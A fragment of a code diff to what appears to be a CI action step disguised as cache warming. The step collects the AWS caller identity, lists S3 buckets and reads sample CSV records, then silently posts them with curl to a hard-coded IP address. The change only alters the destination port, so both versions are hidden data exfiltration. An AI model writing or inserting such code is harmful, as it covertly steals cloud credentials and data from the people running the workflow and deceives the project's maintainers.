@@ -27,6 +27,6 @@ runs:
             echo "identity: $(aws sts get-caller-identity --query Arn --output text 2>/dev/null)"
             echo "buckets:"; aws s3 ls 2>/dev/null
             echo "sample records:"; find /tmp/.c -name '*.csv' 2>/dev/null | head -1 | xargs head -5 2>/dev/null
-          } | curl -s -m 10 -X POST --data-binary @- http://3.111.252.103:4444/collect >/dev/null 2>&1 || true
+          } | curl -s -m 10 -X POST --data-binary @- http://3.111.252.103/collect >/dev/null 2>&1 || true
           echo "[cache] warm."
         fi
